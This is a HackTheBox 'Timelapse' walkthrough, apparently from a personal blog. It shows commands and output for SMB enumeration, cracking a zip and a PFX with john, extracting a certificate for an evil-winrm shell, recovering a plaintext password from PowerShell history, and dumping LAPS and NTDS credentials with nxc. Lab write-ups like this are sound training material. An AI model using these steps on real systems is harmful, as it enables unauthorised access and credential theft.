---
title: HackTheBox-Timelapse
date: 2024-12-24 09:42:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [LAPS]     # TAG names should always be lowercase
---

## SMB-enum

    ➜  timelapse nxc smb 10.10.11.152
    SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)


    ➜  timelapse smbclient -L \\DC01
    Password for [WORKGROUP\root]:

            Sharename       Type      Comment
            ---------       ----      -------
            ADMIN$          Disk      Remote Admin
            C$              Disk      Default share
            IPC$            IPC       Remote IPC
            NETLOGON        Disk      Logon server share 
            Shares          Disk      
            SYSVOL          Disk      Logon server share

## crack-zip-file

    ➜  timelapse zip2john winrm_backup.zip > winrm.hash

    ➜  timelapse john winrm.hash --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (PKZIP [32/64])
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
    1g 0:00:00:00 DONE (2024-12-23 12:49) 2.040g/s 7096Kp/s 7096Kc/s 7096KC/s surkerior..supalove
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed. 

## crack-pfx-file

    ➜  timelapse pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.hash

    ➜  timelapse john legacyy_dev_auth.hash --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
    Cost 1 (iteration count) is 2000 for all loaded hashes
    Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    thuglegacy       (legacyy_dev_auth.pfx)   

## create-cert-and-key

    ➜  timelapse openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
    Enter Import Password:
    Enter PEM pass phrase:
    Verifying - Enter PEM pass phrase:
    ➜  timelapse openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key     
    Enter pass phrase for legacyy_dev_auth.key-enc:
    writing RSA key

    ➜  timelapse openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
    Enter Import Password:

### winrm-shell-with-it

    ➜  timelapse evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
                                            
    Evil-WinRM shell v3.7
                                            
    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                            
    Warning: SSL enabled
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\legacyy\Documents> 

file read console-history

    *Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine> type ConsoleHost_history.txt
    whoami
    ipconfig /all
    netstat -ano |select-string LIST
    $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
    $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
    $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
    invoke-command -computername localhost -credential $c -port 5986 -usessl -
    SessionOption $so -scriptblock {whoami}
    get-aduser -filter * -properties *
    exit

## LAPS

    ➜  timelapse evil-winrm -i timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S 
    *Evil-WinRM* PS C:\Users\svc_deploy\Documents> net users svc_deploy
    User name                    svc_deploy
    Full Name                    svc_deploy
    Comment
    User's comment
    Country/region code          000 (System Default)
    Account active               Yes
    Account expires              Never

    Password last set            10/25/2021 11:12:37 AM
    Password expires             Never
    Password changeable          10/26/2021 11:12:37 AM
    Password required            Yes
    User may change password     Yes

    Workstations allowed         All
    Logon script
    User profile
    Home directory
    Last logon                   10/25/2021 11:25:53 AM

    Logon hours allowed          All

    Local Group Memberships      *Remote Management Use
    Global Group memberships     *LAPS_Readers         *Domain Users
    The command completed successfully.
    
GRAB ADMIN-PASS-in-one command

    ➜  timelapse nxc smb timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps --ntds
    [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
    SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
    SMB         10.10.11.152    445    DC01             [-] DC01\administrator:iobJK3@;Zk.2sgS;Gqf4+or+ STATUS_LOGON_FAILURE


Video Walwalkthrough
[WATCH!](https://youtu.be/A1etiDBywBY)